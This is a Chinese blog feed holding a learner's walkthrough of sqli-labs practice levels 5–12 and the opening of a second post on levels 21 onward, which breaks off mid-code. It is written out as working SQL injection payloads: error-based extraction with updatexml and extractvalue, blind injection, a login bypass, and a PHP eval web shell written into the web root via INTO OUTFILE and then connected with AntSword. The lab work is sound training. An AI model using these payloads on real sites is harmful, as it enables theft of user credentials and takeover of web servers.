        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Web题中SQL注入是最重要的类型之一。之前只是简单的了解， SQL注入对于我这样的新手来说可能会有一点难度，当时学的时候学习了sqli-labs的前四关，现在重新捡起，继续打。</p><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><p>目前我了解到两种方法。</p><h2 id="第一种方法——报错型注入"><a href="#第一种方法——报错型注入" class="headerlink" title="第一种方法——报错型注入"></a>第一种方法——报错型注入</h2><h3 id="旧方法"><a href="#旧方法" class="headerlink" title="旧方法"></a>旧方法</h3><p>肯定是有注入的，所以判断是否有注入就省去了。判断闭合符号是单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>可报错并显示出数据库。<br><img src="https://img-blog.csdnimg.cn/20200418005040402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>显示表名，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005115158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005135190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>爆数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27%20and%20(updatexml(1,concat(0x7e,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(username)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005150512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>没显示完，还有下一步，再爆后面的数据，用mid函数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,mid((<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">32</span>),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005223199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="新get"><a href="#新get" class="headerlink" title="新get"></a>新get</h3><p>还有一个语句可以实现，看到了就顺便总结下来：<br>爆数据库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x23,database(),0x23))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005241778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆表名，可以通过limit函数爆出目标数据表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x23,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">0x23</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005255803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆列名，同样是用limit函数进行选择列爆破：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x23,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x23</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005317660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆数据值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x23,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x23</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005335218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="第二种——盲注"><a href="#第二种——盲注" class="headerlink" title="第二种——盲注"></a>第二种——盲注</h2><p>判断数据库长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())&gt;0--+</span><br><span class="line">?id=1&#x27; and length(database())=8<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005354638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>数据库长度判断出来，下一步爆库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),1,1)=83)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005411373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这样判断太慢，直接burp爆破就行，之前尝试的burp爆破是一个post类型，这次是get类型，所以就再总结一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">100</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005429901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>设置好开始爆破<br><img src="https://img-blog.csdnimg.cn/20200418005459760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后放到一个转ascii码的小工具里转换<br><img src="https://img-blog.csdnimg.cn/20200418005513567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以爆出数据库名。<br>其他的只需改动语句，爆破方式一样。只是比较慢。<br>脚本暂时还不会写，先放着，学会了再补充。</p><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><p>双引号闭合，其他的与第五关相同，照抄OK。</p><h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><p>对于我来说时一种新的注入方式，<br>判断闭合符号。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005532728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>闭合符号是<code>&#39;))</code>,试着上传一句话木马，<br>路径不知道，先拿个简单关查看下路径（做题的时候要靠自己找，刚了解到，我也没见过这类题，所以见到再说）<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,@@basedir,@@datadir --+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005634601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php @eval($_POST[&quot;lxj&quot;]);?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\lxj.php&quot;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418005727416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>回显报错了,看师傅们的博客是：虽然报错了，但是在本地文件是可以看到上传成功的，可是为什么我的就没有。<br><img src="https://img-blog.csdnimg.cn/20200418005750452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>奇怪，啥都没有。再百度看了好几篇博客，终于找到了解决办法，是我本地的mysql没有写入权限。所以没有办法上传成功，解决办法也是尝试过好几遍才对了。<br>解决办法如下：<br>打开mysql目录找到<code>my.in</code>这个文件，<br><img src="https://img-blog.csdnimg.cn/20200418005807306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><p>打开这个文件：添加<code>secure-file-priv =&quot;&quot;</code>保存<br>一般出现没有写入权限的问题的应该就是缺少了。直接加一个就行。（反正我的是没有这句话。）只针对这一种情况，其他的不好说。<img src="https://img-blog.csdnimg.cn/20200418011558846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后再重新写入php文件，但是再看还是没有任何东西，然后又查百度，找了三四遍博客终于让我找到了我错在哪里了。原来就是一个低级错误，保存之后记得重新启动mysql。再次上传php就行。<br>这次就上传成功了。<br><img src="https://img-blog.csdnimg.cn/20200418005825967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>运行一下看看，<br><img src="https://img-blog.csdnimg.cn/20200418005840458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以，那就用菜刀或者蚁剑连接。<br><a href="http://127.0.0.1/sqli-labs-master/Less-13/">http://127.0.0.1/sqli-labs-master/Less-13/</a><br>添加成功，连上了。<br><img src="https://img-blog.csdnimg.cn/20200418005939200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>查看一下<br><img src="https://img-blog.csdnimg.cn/2020041800595898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>ok木得问题，过关。</p><h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><p>这道题是布尔盲注<br>看题目单引号闭合，试一下<br><img src="https://img-blog.csdnimg.cn/20200418010014164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>但是这道题可以使用第七关的方法上传一个木马，用蚁剑或菜刀连接。步骤略，看结果<br><img src="https://img-blog.csdnimg.cn/20200418010035265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看了可以，那就不管它了。<br>在回头说盲注，盲注是布尔盲注，可以用手注，也可以用burp爆破。跟第五关差不多，不再重复</p><h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p>看题是基于单引号闭合的时间盲注<br>反正也没事试一遍，发现确实是不管payload是什么，都会回显<code>You are in ......</code><br>想起来之前第九关和第十关差不多，第十关以前总结过，再回头看一下。就不再重新写一遍了。<br>只是第十关是双引号闭合，其他的一样，没什么差别。<br>额咳咳，出于好奇，我又闲着试试，第九关能不能传入木马，结果还真成功了<br><img src="https://img-blog.csdnimg.cn/20200418010053763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>啊哈，意外之喜。第十关应该也行。</p><h1 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h1><p>只标题。就试试可不可以传入木马就行了，顺便连接一下。<br><img src="https://img-blog.csdnimg.cn/20200418010114443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20200418010153369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>成功了，开心哈。</p><h1 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h1><p>从这一关往后是post类型的注入。之前只了解过万能密码<br>随便输入账户密码都输入admin，登录成功。<br><img src="https://img-blog.csdnimg.cn/20200418010806863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后再输入账户<code>lalala</code>密码<code>1234</code>，发现有报错，<br><img src="https://img-blog.csdnimg.cn/20200418010823268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这就能证明本关的确是报错注入。</p><h2 id="第一种姿势"><a href="#第一种姿势" class="headerlink" title="第一种姿势"></a>第一种姿势</h2><p>万能密码<br>username：<code>admin&#39;#</code>，密码随意。<br><img src="https://img-blog.csdnimg.cn/20200418010839132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; and extractvalue(1,concat(0x7e,database(),0x7e))#</span><br><span class="line">admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br></pre></td></tr></table></figure><p>两句均可，就全部记了下来，网上大佬的博客很多，不同的姿势也好几个，这里暂时总结几种我学会的吧。<br><img src="https://img-blog.csdnimg.cn/20200418010904443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆数据表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e))#</span><br></pre></td></tr></table></figure><p>limit决定爆哪个表<br><img src="https://img-blog.csdnimg.cn/20200418010924363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第三个表爆出<code>users</code>，可进行下一步，爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 1,1),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418010937339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; and extractvalue(1,concat(0x7e,(select username from users limit 1,1),0x7e))#</span><br></pre></td></tr></table></figure><p>limit决定爆哪个信息<br><img src="https://img-blog.csdnimg.cn/2020041801094958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="第二种姿势"><a href="#第二种姿势" class="headerlink" title="第二种姿势"></a>第二种姿势</h2><p>随便构造账户名和密码。然后进行抓包<br><img src="https://img-blog.csdnimg.cn/20200418011023949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>发送到<code>Repeater</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and 1&#x3D;1%23 &amp;passwd&#x3D;1234&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418011043508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,database()%23 &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418011106279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;%23 &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418011122761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆出四张表，然后根据前几关的套路可查询<code>users</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;%23 &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418011133807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>同时查询<code>username</code>和<code>password</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select group_concat(username),group_concat(password) from users%23 &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200418011145704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到这么多数据。get！！</p><h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><p>闭合方式不同，此关是双引号闭合。步骤与十一关相同。<br>先学习到这里，沉淀一下，消化消化新知识。继续加油！</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场攻关（21-31）</title>
      <link href="/2020/08/23/sqli-labs%E9%9D%B6%E5%9C%BA%E6%94%BB%E5%85%B3%EF%BC%8821%E2%80%9431%EF%BC%89/"/>
      <url>/2020/08/23/sqli-labs%E9%9D%B6%E5%9C%BA%E6%94%BB%E5%85%B3%EF%BC%8821%E2%80%9431%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><h2 id="常规型"><a href="#常规型" class="headerlink" title="常规型"></a>常规型</h2><p>使用admin登录尝试，<br><img src="https://img-blog.csdnimg.cn/2020062821012823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>判断闭合符号<br>使用base64进行了编码，所以payload也使用base64进行一次编码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin\</span><br><span class="line">YWRtaW5c</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200628210414565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以闭合符号为<code>&#39;)</code><br>然后就可以进行注入了<br>判断列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) order by 1<span class="comment">#</span></span><br><span class="line">YWRtaW4nKSBvcmRlciBieSAxIw==</span><br></pre></td></tr></table></figure><p>测试到4，报错，列数只有3。跟前面一样<br><img src="https://img-blog.csdnimg.cn/20200628210908983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>联合查询，判断回显点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020062821150715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>回显点找到，爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw==</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200628211718216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>接着爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 